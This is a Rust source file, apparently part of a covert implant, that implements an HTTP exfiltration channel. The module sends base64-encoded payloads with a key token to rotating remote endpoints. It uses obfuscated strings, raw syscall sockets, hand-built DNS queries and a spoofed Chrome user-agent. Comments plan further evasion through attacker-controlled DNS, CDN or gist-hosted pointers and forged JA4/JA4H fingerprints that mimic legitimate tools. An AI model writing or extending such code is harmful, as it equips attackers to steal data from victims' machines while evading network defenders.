use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;

use super::{Channel, ChannelInfo, Latency, SendContext};
use core::net::SocketAddr;
use core::net::Ipv4Addr;
use crate::dns;
use crate::sys;
use crate::errors::ChannelError;
use glimmer_obfstr::obfs;


pub struct HTTPChannel {
    endpoints: Vec<String>,
    current: std::sync::atomic::AtomicUsize,
    info: ChannelInfo,
}

impl HTTPChannel {
    pub fn new(endpoints: Vec<String>) -> Result<Self, Box<dyn std::error::Error>> {
        Ok(HTTPChannel {
            endpoints,
            current: std::sync::atomic::AtomicUsize::new(0),
            info: ChannelInfo {
                name: "http",
                max_payload: 1 << 20,
                bidirectional: true,
                confirmed: true,
                stealth: 1,
                latency: Latency::Realtime,
            },
        })
    }

    fn next_endpoint(&self) -> &str {
        let idx = self.current.load(std::sync::atomic::Ordering::Relaxed);
        &self.endpoints[idx % self.endpoints.len()]
    }

    fn _advance_endpoint(&self) {
        self.current.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    }

    fn parse_host_port(endpoint: &str) -> (&str, u16) {

        let without_scheme = endpoint
            .strip_prefix(obfs!("https://").as_str())
            .or_else(|| endpoint.strip_prefix(obfs!("http://").as_str()))
            .unwrap_or(endpoint);

        if let Some(pos) = without_scheme.rfind(':') {
            let port = without_scheme[pos + 1..]
                .trim_end_matches('/')
                .parse::<u16>()
                .unwrap_or(80);
            let host = &without_scheme[..pos];
            (host, port)
        } else {
            let host = without_scheme.trim_end_matches('/');
            if endpoint.starts_with(obfs!("https://").as_str()) {
                (host, 443)
            } else {
                (host, 80)
            }
        }
    }

}

impl Channel for HTTPChannel {
    fn info(&self) -> &ChannelInfo {
        &self.info
    }

    fn send(&self, ctx: &SendContext) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
        let endpoint = self.next_endpoint();
        let (host, port) = Self::parse_host_port(endpoint);

        let key_id_hex = hex::encode(ctx.key_id);
        let payload_b64 = BASE64.encode(&ctx.payload);
        // let body = format!("{}{}", key_id_hex, payload_b64);
        let body = format!("data={}&token={}", payload_b64, key_id_hex);

        // Create socket via syscall
        let fd = match sys::socket_tcp() {
            Ok(fd) => fd,
            Err(e) => {
                return Err(e.into());
            }
        };

        let mut last_err: Option<ChannelError> = None;
        let mut connected = false;

        // will have to put a lot of thought into the dns portion here.
        // lot of options, doh to a popular dns like 1.1.1.1
        // piggyback on existing resolvers
        // query a dns server we control for a popular domain but return our own ips
        // use the ip to encode data, likely easy to flag with non-routable ips/etc without a complex list of ranges to avoid
        // encode the ip into a legitimate looking github gist or repo
        // host behind a popular cdn or a pointer file behind a popular cdn
        // lot of trade-offs and ease of logging at each step
        // will think of other creative solutions for this soon
        if let Ok(ip) = host.parse::<Ipv4Addr>() {
            // Already an IP, skip DNS
            let addr = SocketAddr::from((ip, port));
            crate::dbg_log!("[http] connecting to endpoint {}:{}", ip, port);
            match sys::connect_tcp(fd, &addr)
                .map_err(|e| ChannelError::SendFailed(e.to_string())) {
                    Ok(()) => { connected = true; }
                    Err(e) => last_err = Some(e),
            }
        } else {
            // Resolve hostname using our udp socket and raw crafted packet for now, try each ip until one connects
            match dns::lookup_a(host) {
                Ok(ips) => {
                    for ip in ips.v4_records() {
                        let addr = SocketAddr::from((ip.addr, port));
                        crate::dbg_log!("[http] connecting to endpoint {}:{}", ip.addr, port);
                        match sys::connect_tcp(fd, &addr)
                            .map_err(|e| ChannelError::SendFailed(e.to_string())) {
                                Ok(()) => { connected = true; break; }
                                Err(e) => last_err = Some(e),
                        }
                    }
                }
                Err(e) => last_err = Some(ChannelError::SendFailed(format!("dns {host}: {e}"))),
            }
        }

        if !connected {
            crate::dbg_log!("[http] failed to connect to any endpoints");
            return Err(ChannelError::SendFailed(
                last_err.map(|e| e.to_string()).unwrap_or_else(|| "no addresses".into())
            ).into());
        }
        // todo: iterate through endpoints with advance_endpoint() if all ips fail

        // Set read timeout
        let _ = sys::set_read_timeout(fd, 30);

        // will pull from a list of agents later based on call-site, and work on making sure JA4 and JA4H fingerprints align with each other and make sense with callsite
        // e.g. if callsite is mimicking dnf5 we need a JA4 and JA4H fingerprint that match dnf5 not just each other
        // the JA4H work is pretty straightforward just need to capture some real requests, making it match callsites is pretty straightforward, need functionality for matching JA4 fingerprints and also to capture some
        let mut req = Vec::new();
        req.extend_from_slice(obfs!("POST / HTTP/1.1\r\n").as_bytes());
        req.extend_from_slice(obfs!("Host: ").as_bytes());
        req.extend_from_slice(host.as_bytes());
        req.extend_from_slice(obfs!("\r\n").as_bytes());
        req.extend_from_slice(obfs!("User-Agent: ").as_bytes());
        req.extend_from_slice(
            obfs!("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36").as_bytes()
        );
        req.extend_from_slice(obfs!("\r\n").as_bytes());
        req.extend_from_slice(obfs!("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n").as_bytes());
        req.extend_from_slice(obfs!("Accept-Language: en-US,en;q=0.5\r\n").as_bytes());
        req.extend_from_slice(obfs!("Accept-Encoding: gzip, deflate\r\n").as_bytes());
        req.extend_from_slice(
            obfs!("Content-Type: application/x-www-form-urlencoded\r\n").as_bytes(),
        );
        req.extend_from_slice(obfs!("Content-Length: ").as_bytes());
        req.extend_from_slice(body.len().to_string().as_bytes());
        req.extend_from_slice(obfs!("\r\n").as_bytes());
        req.extend_from_slice(obfs!("Connection: keep-alive\r\n").as_bytes());
        req.extend_from_slice(obfs!("\r\n").as_bytes());
        req.extend_from_slice(body.as_bytes());

        // Write via syscall
        if let Err(e) = sys::write_all(fd, &req) {
            let _ = sys::close(fd);
            return Err(e.into());
        }

        // Read response via syscall
        let mut response = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            match sys::read(fd, &mut buf) {
                Ok(0) => break,
                Ok(n) => response.extend_from_slice(&buf[..n]),
                Err(_) => break,
            }
        }

        let _ = sys::close(fd);

        // Extract body from response
        if let Some(pos) = find_header_end(&response) {
            let resp_body = &response[pos..];
            if resp_body.is_empty() {
                Ok(None)
            } else {
                Ok(Some(resp_body.to_vec()))
            }
        } else {
            Ok(None)
        }
    }
}

/// Find \r\n\r\n in response bytes without using string conversion.
fn find_header_end(data: &[u8]) -> Option<usize> {
    for i in 0..data.len().saturating_sub(3) {
        if data[i] == b'\r'
            && data[i + 1] == b'\n'
            && data[i + 2] == b'\r'
            && data[i + 3] == b'\n'
        {
            return Some(i + 4);
        }
    }
    None
}